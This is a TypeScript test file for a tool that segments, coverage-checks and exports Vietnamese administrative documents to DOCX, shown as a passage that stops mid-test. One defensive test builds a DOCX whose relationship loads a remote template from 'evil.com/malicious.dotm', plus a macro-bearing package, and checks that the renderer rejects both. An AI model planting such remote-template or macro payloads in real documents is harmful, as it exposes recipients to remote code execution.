import test from "node:test";
import assert from "node:assert/strict";
import JSZip from "jszip";
import type { SourceBlock, DocumentState, DocumentFormatType } from "../src/shared/schemas/document.schema.ts";
import { segmentSourceBlocks } from "../src/server/structuralSegmenter.ts";
import { isSeparatorParagraph, containsSeparatorParagraph, startsWithSeparatorParagraph } from "../src/shared/separator.ts";
import { isDecorativeLineShape, hasReplaceableHeaderShapeLines } from "../src/utils/sourceHeaderShapes.ts";
import { createWorkspaceSnapshot, makePartition, workspaceInvariantErrors } from "../src/utils/workspaceState.ts";
import { approveWorkspacePartition } from "../src/utils/workspaceTransactions.ts";
import { reconstructFromReviewedBlocks } from "../src/utils/importReview.ts";
import { prepareExportCandidate, isCandidateEligibleForExport, isPackageSafeForDiagnosticRender } from "../src/utils/exportCandidate.ts";
import { generateND30DocxBuffer } from "../src/utils/docxExport.ts";
import { buildSourceToWorkspaceCoverage } from "../src/shared/sourceMapping.ts";

const makeDoc = (overrides: Partial<DocumentState> = {}): DocumentState => ({
  orgHeader1: "",
  orgHeader2: "",
  nationalHeader1: "",
  nationalHeader2: "",
  locationAndDate: "Hà Nội, ngày 10 tháng 10 năm 2026",
  documentType: "THÔNG BÁO",
  referenceNumber: "Số 01/TB-VP",
  subject: "Về việc thực hiện nhiệm vụ",
  bodyHtml: "<p>Nội dung.</p>",
  signTitle: "",
  signName: "",
  recipients: "",
  appendices: [],
  unclassified: [],
  ...overrides,
});

const makeSourceTableBlock = (
  id: string,
  index: number,
  role: SourceBlock["role"],
  cells: Array<{ cellId: string; text: string }>,
): SourceBlock => ({
  id,
  index,
  kind: "table",
  role,
  text: cells.map(cell => cell.text).join("\t"),
  tableModel: {
    tableId: `${id}_table`,
    rowsCount: 1,
    columnsCount: cells.length,
    gridColumnsTwips: cells.map(() => 4500),
    tableWidthTwips: 4500 * cells.length,
    widthType: "dxa",
    alignment: "left",
    hasBorders: false,
    rows: [{
      rowIndex: 0,
      isHeader: false,
      cantSplit: true,
      cells: cells.map((cell, colIndex) => ({
        cellId: cell.cellId,
        rowIndex: 0,
        colIndex,
        gridColumn: colIndex,
        rowSpan: 1,
        gridSpan: 1,
        text: cell.text,
        paragraphs: cell.text.split(/\r?\n/).map(text => ({ text })),
      })),
    }],
  },
});

test("Đợt A & B: Separator NĐ30 ngay sau trích yếu được bảo toàn trong Body, HTML và candidate", async () => {
  const separators = ["-----", "- - -", "___", "* * *"];
  for (const sep of separators) {
    const blocks: SourceBlock[] = [
      { id: "b_org", index: 0, kind: "paragraph", role: "unclassified", text: "VĂN PHÒNG CHÍNH PHỦ" },
      { id: "b0", index: 1, kind: "paragraph", role: "unclassified", text: "CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM" },
      { id: "b1", index: 2, kind: "paragraph", role: "unclassified", text: "Độc lập - Tự do - Hạnh phúc" },
      { id: "b2", index: 3, kind: "paragraph", role: "unclassified", text: "Số: 01/TB-VP" },
      { id: "b3", index: 4, kind: "paragraph", role: "unclassified", text: "Hà Nội, ngày 10 tháng 10 năm 2026" },
      { id: "b4", index: 5, kind: "paragraph", role: "unclassified", text: "THÔNG BÁO" },
      { id: "b5", index: 6, kind: "paragraph", role: "unclassified", text: "Về việc tổ chức hội nghị tổng kết" },
      { id: "b6", index: 7, kind: "paragraph", role: "unclassified", text: sep },
      { id: "b7", index: 8, kind: "paragraph", role: "unclassified", text: "Kính gửi các đơn vị trực thuộc cơ quan." },
    ];

    const segmented = segmentSourceBlocks(blocks, {
      filename: "test-nd30-sep.docx",
      fileType: "docx",
      standardType: "administrative",
    });

    const sepBlock = segmented.blocks?.find(b => b.id === "b6");
    assert.equal(sepBlock?.role, "body", `Separator '${sep}' phải có role='body' trong NĐ30`);
    assert.ok(segmented.body.sourceBlockIds.includes("b6"), `Separator '${sep}' phải có ID trong body.sourceBlockIds`);
    assert.ok(segmented.body.html.includes(sep), `Separator '${sep}' phải có trong body.html`);

    const reconstructed = reconstructFromReviewedBlocks(
      segmented.blocks ?? blocks,
      "state",
      segmented
    );

    // Verify workspace snapshot integrity
    const pending = createWorkspaceSnapshot({
      doc: makeDoc({
        ...reconstructed.fields,
        bodyHtml: segmented.body.html,
        draftNote: reconstructed.draftNote,
        appendices: reconstructed.appendices,
        unclassified: reconstructed.unclassified,
      }),
      standardType: "state",
      reviewBlocks: segmented.blocks ?? blocks,
      structuredImport: segmented,
    }, {
      blobHash: "hash-nd30-" + sep.replace(/\s+/g, ""),
      generation: 1,
    });

    const invariantErrors = workspaceInvariantErrors(pending);
    assert.deepEqual(invariantErrors, [], `Workspace snapshot cho separator '${sep}' không được có lỗi invariant`);

    const approval = approveWorkspacePartition(pending);
    assert.ok(approval.ok, "Phê duyệt phân vùng phải thành công");

    // Verify candidate DOCX contains the separator
    const candidate = await prepareExportCandidate({
      doc: approval.snapshot.doc,
      reviewBlocks: approval.snapshot.reviewBlocks,
      standardType: "state",
      structuredImport: approval.snapshot.structuredImport,
      workspace: approval.snapshot.workspace,
    });

    assert.ok(candidate.documentXml.includes(sep), `DOCX ứng viên phải chứa separator '${sep}'`);
    assert.equal(candidate.safe, true, `Candidate phải an toàn khi separator '${sep}' được bảo toàn`);
    assert.equal(candidate.downloadable, true, "Candidate phải được phép tải");
  }
});

test("Đợt A & B: HD05 giữ cả separator dưới trích yếu VÀ separator trong thân bài", async () => {
  const blocks: SourceBlock[] = [
    { id: "b0", index: 0, kind: "paragraph", role: "unclassified", text: "ĐẢNG CỘNG SẢN VIỆT NAM" },
    { id: "b1", index: 1, kind: "paragraph", role: "unclassified", text: "NGHỊ QUYẾT" },
    { id: "b2", index: 2, kind: "paragraph", role: "unclassified", text: "Về việc thực hiện nhiệm vụ trọng tâm" },
    { id: "b3", index: 3, kind: "paragraph", role: "unclassified", text: "-----" },
    { id: "b4", index: 4, kind: "paragraph", role: "unclassified", text: "Điều 1. Toàn thể đảng viên chấp hành nghiêm túc." },
    { id: "b5", index: 5, kind: "paragraph", role: "unclassified", text: "* * *" },
    { id: "b6", index: 6, kind: "paragraph", role: "unclassified", text: "Điều 2. Các chi bộ trực thuộc tổ chức quán triệt." },
  ];

  const segmented = segmentSourceBlocks(blocks, {
    filename: "test-hd05-multi-sep.docx",
    fileType: "docx",
    standardType: "party",
  });

  const sepUnderSubject = segmented.blocks?.find(b => b.id === "b3");
  assert.equal(sepUnderSubject?.role, "separator", "Dấu separator dưới trích yếu phải mang role='separator'");

  const sepInBody = segmented.blocks?.find(b => b.id === "b5");
  assert.equal(sepInBody?.role, "body", "Dấu separator giữa thân bài '* * *' phải mang role='body'");
  assert.ok(segmented.body.sourceBlockIds.includes("b5"), "Separator thân bài b5 phải nằm trong body.sourceBlockIds");
  assert.ok(segmented.body.html.includes("* * *"), "Separator thân bài '* * *' phải nằm trong body.html");

  const exportData: DocumentFormatType = {
    regime: "party",
    headerProfile: "generic",
    orgHeader1: "ĐẢNG BỘ CÔNG TY",
    orgHeader2: "CHI BỘ VĂN PHÒNG",
    nationalHeader1: "ĐẢNG CỘNG SẢN VIỆT NAM",
    nationalHeader2: "",
    locationAndDate: "Hà Nội, ngày 15 tháng 10 năm 2026",
    documentType: "NGHỊ QUYẾT",
    referenceNumber: "Số 05-NQ/ĐU",
    subject: "Về việc thực hiện nhiệm vụ trọng tâm",
    bodyHtml: segmented.body.html,
    signTitle: "BÍ THƯ",
    signName: "Nguyễn Văn A",
    recipients: "Các chi bộ trực thuộc",
    fontFamily: "Times New Roman",
    fontSize: 13,
  };

  // Export to DOCX
  const buf = await generateND30DocxBuffer(exportData);

  const zip = await JSZip.loadAsync(buf);
  const xml = await zip.file("word/document.xml")!.async("string");

  // Exporter renders '-----' under subject
  assert.ok(xml.includes("-----"), "DOCX phải chứa separator '-----' dưới trích yếu");
  // Exporter preserves '* * *' in body
  assert.ok(xml.includes("* * *"), "DOCX phải chứa separator '* * *' trong thân bài");
});

test("Đợt A & B: Phát hiện lỗi thiếu khối nguồn Body trước khi compose (Coverage Gate)", async () => {
  const blocks: SourceBlock[] = [
    { id: "b0", index: 0, kind: "paragraph", role: "unclassified", text: "THÔNG BÁO" },
    { id: "b1", index: 1, kind: "paragraph", role: "unclassified", text: "Về việc kiểm tra" },
    { id: "b2", index: 2, kind: "paragraph", role: "unclassified", text: "Đoạn 1 thân bài." },
    { id: "b3", index: 3, kind: "paragraph", role: "unclassified", text: "Đoạn 2 bị mất trước compose." },
  ];

  const reviewedBlocks = blocks.map(b => b.id === "b0" || b.id === "b1" ? { ...b, role: "metadata" as const } : { ...b, role: "body" as const });
  const incompleteBodyHtml = "<p>Đoạn 1 thân bài.</p>"; // thiếu b3

  const snapshot = createWorkspaceSnapshot({
    doc: makeDoc({
      documentType: "THÔNG BÁO",
      subject: "Về việc kiểm tra",
      bodyHtml: incompleteBodyHtml,
    }),
    standardType: "state",
    reviewBlocks: reviewedBlocks,
    structuredImport: null,
  }, {
    blobHash: "hash-dropped-block",
    generation: 1,
  });

  const errors = workspaceInvariantErrors(snapshot);
  assert.ok(
    errors.some(e => e.includes("body_paragraph_omitted") || e.includes("missing_body_block")),
    `Coverage gate phải bắt được khối nguồn b3 bị mất: ${JSON.stringify(errors)}`
  );

  // Candidate generation phải bị chặn
  const candidate = await prepareExportCandidate({
    doc: snapshot.doc,
    reviewBlocks: snapshot.reviewBlocks,
    standardType: "state",
    workspace: snapshot.workspace,
    structuredImport: null,
  });

  assert.equal(candidate.safe, false, "Candidate không được safe khi nguồn bị mất trước compose");
  assert.equal(candidate.downloadable, false, "Candidate không được downloadable khi nguồn bị mất");
});

test("Đợt A & B: Đoạn văn trùng chữ chỉ có 1 đích thực tế phải báo lỗi coverage (P1 Probe 1)", async () => {
  const blocks: SourceBlock[] = [
    { id: "b0", index: 0, kind: "paragraph", role: "metadata", text: "THÔNG BÁO" },
    { id: "b1", index: 1, kind: "paragraph", role: "body", text: "Đồng ý phê duyệt phương án." },
    { id: "b2", index: 2, kind: "paragraph", role: "body", text: "Đồng ý phê duyệt phương án." },
  ];

  // Working state chỉ có 1 đoạn "Đồng ý phê duyệt phương án." dù node lineage chứa cả hai ID
  const snapshot = createWorkspaceSnapshot({
    doc: makeDoc({
      documentType: "THÔNG BÁO",
      bodyHtml: "<p>Đồng ý phê duyệt phương án.</p>",
    }),
    standardType: "state",
    reviewBlocks: blocks,
    structuredImport: null,
  }, {
    blobHash: "hash-dup-text",
    generation: 1,
  });

  const errors = workspaceInvariantErrors(snapshot);
  assert.ok(
    errors.some(e => e.includes("missing_body_block:b2") || e.includes("body_paragraph_omitted")),
    `Phải phát hiện việc thiếu thực thể đoạn văn thứ hai dù trùng chữ: ${JSON.stringify(errors)}`
  );

  const coverage = buildSourceToWorkspaceCoverage(snapshot);
  assert.equal(coverage.isFullyCovered, false, "Không được báo isFullyCovered=true khi 2 nguồn trùng chữ chỉ có 1 đích");
});

test("Đợt A & B: Chỉnh sửa đoạn A không được miễn kiểm tra độ bao phủ đoạn B (P1 Probe 2)", async () => {
  const blocks: SourceBlock[] = [
    { id: "b0", index: 0, kind: "paragraph", role: "metadata", text: "THÔNG BÁO" },
    { id: "b1", index: 1, kind: "paragraph", role: "body", text: "Đoạn 1 nguyên bản." },
    { id: "b2", index: 2, kind: "paragraph", role: "body", text: "Đoạn 2 nguyên bản." },
  ];

  // Tạo snapshot với 2 đoạn
  const initialSnapshot = createWorkspaceSnapshot({
    doc: makeDoc({
      documentType: "THÔNG BÁO",
      bodyHtml: "<p>Đoạn 1 nguyên bản.</p><p>Đoạn 2 nguyên bản.</p>",
    }),
    standardType: "state",
    reviewBlocks: blocks,
    structuredImport: null,
  }, {
    blobHash: "hash-edit-a",
    generation: 1,
  });

  // Giả lập giao dịch sửa đoạn 1, nhưng vô tình làm mất đoạn 2 trong bodyHtml
  const editedSnapshot = {
    ...initialSnapshot,
    doc: {
      ...initialSnapshot.doc,
      bodyHtml: "<p>Đoạn 1 đã được sửa đổi.</p>", // Đoạn 2 bị mất!
    },
    workspace: {
      ...initialSnapshot.workspace,
      workingRevision: 2,
      nodes: [
        { editableNodeId: "node-1", container: "body" as const, html: "<p>Đoạn 1 đã được sửa đổi.</p>", lineage: ["b1"] }
      ],
      ledger: [
        {
          id: "tx-1",
          actor: "user" as const,
          action: "edit" as const,
          kind: "node" as const,
          targetId: "node-1",
          sourceRefs: ["b1"],
          beforeRevision: 0,
          afterRevision: 1,
          beforeFingerprint: initialSnapshot.workspace.initialWorkingFingerprint,
          afterFingerprint: "fp-after-edit",
          confirmed: true,
        }
      ],
    }
  };

  const coverage = buildSourceToWorkspaceCoverage(editedSnapshot);
  assert.equal(coverage.isFullyCovered, false, "Sửa đoạn 1 không được miễn kiểm tra đoạn 2");
  assert.ok(
    coverage.violations.some(v => v.includes("missing_body_block:b2")),
    `Đoạn 2 chưa qua sửa đổi phải được phát hiện là bị mất: ${JSON.stringify(coverage.violations)}`
  );
});

test("Đợt A & B: Nguồn có chữ ký / nơi nhận nhưng đích rỗng phải bị phát hiện (P1 Probe 3)", async () => {
  const blocks: SourceBlock[] = [
    { id: "b_sig", index: 0, kind: "paragraph", role: "signature", text: "GIÁM ĐỐC\nNguyễn Văn A" },
    { id: "b_rec", index: 1, kind: "paragraph", role: "recipients", text: "Nơi nhận:\n- Như Điều 3;\n- Lưu VT." },
  ];

  // Working state có trường signTitle, signName, recipients hoàn toàn rỗng
  const emptyFinalDoc = makeDoc({
    bodyHtml: "",
    signTitle: "",
    signName: "",
    recipients: "",
  });

  const snapshot = createWorkspaceSnapshot({
    doc: emptyFinalDoc,
    standardType: "state",
    reviewBlocks: blocks,
    structuredImport: null,
  }, {
    blobHash: "hash-empty-final",
    generation: 1,
  });

  const coverage = buildSourceToWorkspaceCoverage(snapshot);
  assert.equal(coverage.isFullyCovered, false, "Nguồn có chữ ký/nơi nhận nhưng trường rỗng phải báo không đạt coverage");
  assert.ok(
    coverage.violations.some(v => v.includes("missing_signature_destination")),
    `Phải phát hiện chữ ký chưa có đích: ${JSON.stringify(coverage.violations)}`
  );
  assert.ok(
    coverage.violations.some(v => v.includes("missing_recipients_destination")),
    `Phải phát hiện nơi nhận chưa có đích: ${JSON.stringify(coverage.violations)}`
  );
});

test("Đợt C: Nhận diện đường kẻ Shape độc lập thứ tự thuộc tính XML và kiểm tra Fallback (P2 Fix)", () => {
  // 1. Thứ tự cx trước cy
  const lineCxFirst = `<mc:AlternateContent xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006">
    <mc:Choice Requires="wps">
      <w:drawing><wp:inline><wp:extent cx="1433830" cy="0"/><a:graphic><a:graphicData><a:prstGeom prst="line"/></a:graphicData></a:graphic></wp:inline></w:drawing>
    </mc:Choice>
    <mc:Fallback>
      <w:pict><v:line from="0,0" to="100pt,0"/></w:pict>
    </mc:Fallback>
  </mc:AlternateContent>`;
  assert.equal(isDecorativeLineShape(lineCxFirst), true, "cx đứng trước cy phải được nhận diện là decorative line");

  // 2. Thứ tự cy trước cx
  const lineCyFirst = `<mc:AlternateContent xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006">
    <mc:Choice Requires="wps">
      <w:drawing><wp:inline><wp:extent cy="0" cx="1433830"/><a:graphic><a:graphicData><a:prstGeom prst="line"/></a:graphicData></a:graphic></wp:inline></w:drawing>
    </mc:Choice>
    <mc:Fallback>
      <w:pict><v:line from="0,0" to="100pt,0"/></w:pict>
    </mc:Fallback>
  </mc:AlternateContent>`;
  assert.equal(isDecorativeLineShape(lineCyFirst), true, "cy đứng trước cx cũng phải được nhận diện chính xác");

  // 3. Fallback không tương ứng (Choice là line nhưng Fallback là rect)
  const mismatchFallback = `<mc:AlternateContent xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006">
    <mc:Choice Requires="wps">
      <w:drawing><wp:inline><wp:extent cx="1433830" cy="0"/><a:graphic><a:graphicData><a:prstGeom prst="line"/></a:graphicData></a:graphic></wp:inline></w:drawing>
    </mc:Choice>
    <mc:Fallback>
      <w:pict><v:rect/></w:pict>
    </mc:Fallback>
  </mc:AlternateContent>`;
  assert.equal(isDecorativeLineShape(mismatchFallback), false, "Fallback không phải v:line phải bị từ chối");

  // 4. Đường chéo (to khác from Y > 2pt)
  const diagonalLine = `<mc:AlternateContent xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006">
    <mc:Choice Requires="wps">
      <w:drawing><wp:inline><wp:extent cx="1433830" cy="9525"/><a:graphic><a:graphicData><a:prstGeom prst="straightConnector1"/></a:graphicData></a:graphic></wp:inline></w:drawing>
    </mc:Choice>
    <mc:Fallback>
      <w:pict><v:line from="0,0" to="100pt,20pt"/></w:pict>
    </mc:Fallback>
  </mc:AlternateContent>`;
  assert.equal(isDecorativeLineShape(diagonalLine), false, "Đường chéo (Y lệch lớn) phải bị từ chối");

  // 5. Hình ảnh và Hộp chữ
  const imageShape = `<mc:AlternateContent xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006">
    <mc:Choice Requires="wps">
      <w:drawing><wp:inline><wp:extent cx="1433830" cy="9525"/><a:graphic><a:graphicData><a:blip/></a:graphicData></a:graphic></wp:inline></w:drawing>
    </mc:Choice>
    <mc:Fallback><w:pict><v:shape/></w:pict></mc:Fallback>
  </mc:AlternateContent>`;
  assert.equal(isDecorativeLineShape(imageShape), false, "Shape chứa a:blip phải bị từ chối");
});

test("Đợt D: Chính sách an toàn gói DOCX cho preview chẩn đoán (isPackageSafeForDiagnosticRender)", async () => {
  // 1. Gói DOCX hợp lệ
  const validZip = new JSZip();
  validZip.file("[Content_Types].xml", `<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="xml" ContentType="application/xml"/></Types>`);
  validZip.file("_rels/.rels", `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>`);
  validZip.file("word/document.xml", `<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body/></w:document>`);

  const checkValid = await isPackageSafeForDiagnosticRender(validZip);
  assert.equal(checkValid.safe, true, "Gói tiêu chuẩn hợp lệ phải an toàn để render chẩn đoán");

  // 2. Gói chứa relationship external tới URL bên ngoài
  const evilRelsZip = new JSZip();
  evilRelsZip.file("[Content_Types].xml", validZip.file("[Content_Types].xml")!.async("string"));
  evilRelsZip.file("_rels/.rels", `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.com/malicious.dotm" TargetMode="External"/></Relationships>`);
  evilRelsZip.file("word/document.xml", `<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body/></w:document>`);

  const checkEvilRels = await isPackageSafeForDiagnosticRender(evilRelsZip);
  assert.equal(checkEvilRels.safe, false, "Gói có external relationship URL phải bị từ chối render chẩn đoán");

  // 3. Gói chứa macro vbaProject.bin
  const macroZip = new JSZip();
  macroZip.file("[Content_Types].xml", validZip.file("[Content_Types].xml")!.async("string"));
  macroZip.file("_rels/.rels", `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>`);
  macroZip.file("word/document.xml", `<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body/></w:document>`);
  macroZip.file("word/vbaProject.bin", "binary macro content");

  const checkMacro = await isPackageSafeForDiagnosticRender(macroZip);
  assert.equal(checkMacro.safe, false, "Gói chứa vbaProject.bin phải bị từ chối render chẩn đoán");
});

test("Task 1: step1_rejects_truncated_body_before_approval: nguồn bị cắt một phần chữ không được duyệt", async () => {
  const blocks: SourceBlock[] = [
    { id: "b_head", index: 0, kind: "paragraph", role: "unclassified", text: "THÔNG BÁO" },
    { id: "b_subj", index: 1, kind: "paragraph", role: "unclassified", text: "Về việc thực hiện kế hoạch" },
    { id: "b_body", index: 2, kind: "paragraph", role: "unclassified", text: "ALPHA LONG SOURCE TEXT FOR BODY" },
  ];

  const reviewedBlocks = [
    { ...blocks[0], role: "metadata" as const },
    { ...blocks[1], role: "metadata" as const },
    { ...blocks[2], role: "body" as const },
  ];

  // Working body is truncated to just "ALPHA"
  const truncatedSnapshot = createWorkspaceSnapshot({
    doc: makeDoc({
      documentType: "THÔNG BÁO",
      subject: "Về việc thực hiện kế hoạch",
      bodyHtml: "<p>ALPHA</p>",
    }),
    standardType: "state",
    reviewBlocks: reviewedBlocks,
    structuredImport: null,
  }, {
    blobHash: "hash-truncated-body",
    generation: 1,
  });

  const coverage = buildSourceToWorkspaceCoverage(truncatedSnapshot);
  assert.equal(coverage.isFullyCovered, false, "Coverage phải bắt được đoạn bị cắt chữ");

  const approval = approveWorkspacePartition(truncatedSnapshot);
  assert.equal(approval.ok, false, "Phê duyệt phân vùng B1 phải fail khi body bị cắt ngắn");
});

test("Task 1: step1_rejects_unapproved_paragraph_reorder: đảo thứ tự paragraph nguồn trong Body mà không có giao dịch di chuyển phải bị từ chối duyệt", async () => {
  const blocks: SourceBlock[] = [
    { id: "b_head", index: 0, kind: "paragraph", role: "unclassified", text: "THÔNG BÁO" },
    { id: "b_subj", index: 1, kind: "paragraph", role: "unclassified", text: "Về việc thực hiện kế hoạch" },
    { id: "b_p1", index: 2, kind: "paragraph", role: "unclassified", text: "ALPHA FIRST PARAGRAPH" },
    { id: "b_p2", index: 3, kind: "paragraph", role: "unclassified", text: "BETA SECOND PARAGRAPH" },
  ];

  const reviewedBlocks = [
    { ...blocks[0], role: "metadata" as const },
    { ...blocks[1], role: "metadata" as const },
    { ...blocks[2], role: "body" as const },
    { ...blocks[3], role: "body" as const },
  ];

  // Working body has BETA before ALPHA (unapproved reorder)
  const reorderedSnapshot = createWorkspaceSnapshot({
    doc: makeDoc({
      documentType: "THÔNG BÁO",
      subject: "Về việc thực hiện kế hoạch",
      bodyHtml: "<p>BETA SECOND PARAGRAPH</p><p>ALPHA FIRST PARAGRAPH</p>",
    }),
    standardType: "state",
    reviewBlocks: reviewedBlocks,
    structuredImport: null,
  }, {
    blobHash: "hash-reordered-body",
    generation: 1,
  });

  const coverage = buildSourceToWorkspaceCoverage(reorderedSnapshot);
  assert.equal(coverage.isFullyCovered, false, "Coverage phải bắt được lỗi đảo thứ tự đoạn văn chưa phê duyệt");

  const approval = approveWorkspacePartition(reorderedSnapshot);
  assert.equal(approval.ok, false, "Phê duyệt phân vùng B1 phải fail khi đảo thứ tự không có giao dịch di chuyển");
});

test("Task 1: Đoạn trùng chữ, linebreak, multiple runs và bảng xen kẽ paragraph", async () => {
  // 1. Đoạn trùng chữ thiếu 1 đích:
  const dupBlocks: SourceBlock[] = [
    { id: "b0", index: 0, kind: "paragraph", role: "unclassified", text: "THÔNG BÁO" },
    { id: "b1", index: 1, kind: "paragraph", role: "unclassified", text: "DUPLICATE PARAGRAPH TEXT" },
    { id: "b2", index: 2, kind: "paragraph", role: "unclassified", text: "DUPLICATE PARAGRAPH TEXT" },
  ];
  const reviewedDup = [
    { ...dupBlocks[0], role: "metadata" as const },
    { ...dupBlocks[1], role: "body" as const },
    { ...dupBlocks[2], role: "body" as const },
  ];
  const dupSnapshot = createWorkspaceSnapshot({
    doc: makeDoc({
      documentType: "THÔNG BÁO",
      bodyHtml: "<p>DUPLICATE PARAGRAPH TEXT</p>", // Chỉ có 1 đích cho 2 nguồn trùng chữ
    }),
    standardType: "state",
    reviewBlocks: reviewedDup,
    structuredImport: null,
  }, { blobHash: "hash-dup", generation: 1 });

  const dupCoverage = buildSourceToWorkspaceCoverage(dupSnapshot);
  assert.equal(dupCoverage.isFullyCovered, false, "Thiếu 1 đích cho khối trùng chữ phải báo missing");
  assert.equal(approveWorkspacePartition(dupSnapshot).ok, false, "Không được duyệt khi thiếu đích trùng chữ");

  // 2. Linebreak, multiple runs và bảng xen kẽ paragraph - CA HỢP LỆ PHẢI PASS:
  const validBlocks: SourceBlock[] = [
    { id: "v0", index: 0, kind: "paragraph", role: "unclassified", text: "THÔNG BÁO" },
    { id: "v1", index: 1, kind: "paragraph", role: "unclassified", text: "ALPHA LINE 1\nALPHA LINE 2" },
    { id: "v2", index: 2, kind: "paragraph", role: "unclassified", text: "Đoạn có chữ đậm và nghiêng" },
  ];
  const reviewedValid = [
    { ...validBlocks[0], role: "metadata" as const },
    { ...validBlocks[1], role: "body" as const },
    { ...validBlocks[2], role: "body" as const },
  ];
  const validSnapshot = createWorkspaceSnapshot({
    doc: makeDoc({
      documentType: "THÔNG BÁO",
      bodyHtml: "<p>ALPHA LINE 1<br/>ALPHA LINE 2</p><p>Đoạn có <strong>chữ đậm</strong> và <em>nghiêng</em></p>",
    }),
    standardType: "state",
    reviewBlocks: reviewedValid,
    structuredImport: null,
  }, { blobHash: "hash-valid", generation: 1 });

  const validCoverage = buildSourceToWorkspaceCoverage(validSnapshot);
  assert.equal(validCoverage.isFullyCovered, true, "Body giữ đúng linebreak và inline tags phải đạt coverage");
  assert.equal(approveWorkspacePartition(validSnapshot).ok, true, "Ca giữ đúng phải được duyệt thành công");
});

test("Task 2: Header table mất field dù còn subject không được công nhận", async () => {
  const blocks: SourceBlock[] = [
    {
      id: "b_head_tbl",
      index: 0,
      kind: "table",
      role: "header",
      text: "UBND TỈNH ĐỒNG NAI\tCỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM",
      tableModel: {
        tableId: "tbl_header",
        rowsCount: 1,
        columnsCount: 2,
        gridColumnsTwips: [4500, 4500],
        tableWidthTwips: 9000,
        widthType: "dxa",
        alignment: "left",
        hasBorders: false,
        rows: [{
          rowIndex: 0,
          isHeader: false,
          cantSplit: true,
          cells: [
            { cellId: "c_0_0", rowIndex: 0, colIndex: 0, gridColumn: 0, rowSpan: 1, gridSpan: 1, text: "UBND TỈNH ĐỒNG NAI", paragraphs: [{ text: "UBND TỈNH ĐỒNG NAI" }] },
            { cellId: "c_0_1", rowIndex: 0, colIndex: 1, gridColumn: 1, rowSpan: 1, gridSpan: 1, text: "CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM", paragraphs: [{ text: "CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM" }] },
          ]
        }]
      }
    },
    { id: "b_body", index: 1, kind: "paragraph", role: "body", text: "Nội dung văn bản." },
  ];

  // Working doc has subject, but orgHeader1 and nationalHeader1 are empty and no cell mappings
  const snapshot = createWorkspaceSnapshot({
    doc: makeDoc({
      subject: "Về việc thanh tra các dự án",
      orgHeader1: "",
      nationalHeader1: "",
      bodyHtml: "<p>Nội dung văn bản.</p>",
    }),
    standardType: "state",
    reviewBlocks: blocks,
    structuredImport: null,
  }, { blobHash: "hash-head-tbl-missing", generation: 1 });

  const coverage = buildSourceToWorkspaceCoverage(snapshot);
  assert.equal(coverage.isFullyCovered, false, "Header table có ô bị mất nội dung phải báo lỗi coverage");
  assert.equal(approveWorkspacePartition(snapshot).ok, false, "Approval phải fail khi header table mất ô");
});

test("Task 2: Footer 1x2 table có chữ ký nhưng mất nơi nhận phải bị từ chối duyệt", async () => {
  const blocks: SourceBlock[] = [
    {
      id: "b_footer_tbl",
      index: 0,
      kind: "table",
      role: "signature",
      text: "Nơi nhận:\n- Như trên;\n- Lưu: VT.\tGIÁM ĐỐC\nNguyễn Văn B",
      tableModel: {
        tableId: "tbl_footer",
        rowsCount: 1,
        columnsCount: 2,
        gridColumnsTwips: [4500, 4500],
        tableWidthTwips: 9000,
        widthType: "dxa",
        alignment: "left",
        hasBorders: false,
        rows: [{
          rowIndex: 0,
          isHeader: false,
          cantSplit: true,
          cells: [
            { cellId: "c_recip", rowIndex: 0, colIndex: 0, gridColumn: 0, rowSpan: 1, gridSpan: 1, text: "Nơi nhận:\n- Như trên;\n- Lưu: VT.", paragraphs: [{ text: "Nơi nhận:\n- Như trên;\n- Lưu: VT." }] },
            { cellId: "c_sign", rowIndex: 0, colIndex: 1, gridColumn: 1, rowSpan: 1, gridSpan: 1, text: "GIÁM ĐỐC\nNguyễn Văn B", paragraphs: [{ text: "GIÁM ĐỐC\nNguyễn Văn B" }] },
          ]
        }]
      }
    },
    { id: "b_body", index: 1, kind: "paragraph", role: "body", text: "Nội dung văn bản." },
  ];

  // Working doc has signTitle/signName, but recipients is EMPTY!
  const snapshot = createWorkspaceSnapshot({
    doc: makeDoc({
      signTitle: "GIÁM ĐỐC",
      signName: "Nguyễn Văn B",
      recipients: "", // Bị mất nơi nhận!
      bodyHtml: "<p>Nội dung văn bản.</p>",
    }),
    standardType: "state",
    reviewBlocks: blocks,
    structuredImport: null,
  }, { blobHash: "hash-footer-tbl-missing-recip", generation: 1 });

  const coverage = buildSourceToWorkspaceCoverage(snapshot);
  assert.equal(coverage.isFullyCovered, false, "Footer table có nơi nhận nhưng working doc rỗng nơi nhận phải fail");
  assert.equal(approveWorkspacePartition(snapshot).ok, false, "Approval phải fail khi mất nơi nhận trong bảng cuối");
});

test("Task 2: StructuredImport cũ còn nhưng working field rỗng không được công nhận", async () => {
  const blocks: SourceBlock[] = [
    { id: "b_meta", index: 0, kind: "paragraph", role: "metadata", text: "Về việc thực hiện nhiệm vụ năm 2026" },
    { id: "b_body", index: 1, kind: "paragraph", role: "body", text: "Nội dung văn bản." },
  ];

  // StructuredImport has old subject, but working doc subject was cleared (empty)
  const snapshot = createWorkspaceSnapshot({
    doc: makeDoc({
      subject: "", // Người dùng xóa hoặc không có trong bản làm việc
      bodyHtml: "<p>Nội dung văn bản.</p>",
    }),
    standardType: "state",
    reviewBlocks: blocks,
    structuredImport: {
      standardType: "administrative",
      confidence: 1,
      fields: {
        subject: {
          value: "Về việc thực hiện nhiệm vụ năm 2026",
          sourceBlockIds: ["b_meta"],
        }
      },
      appendices: [],
      signatures: [],
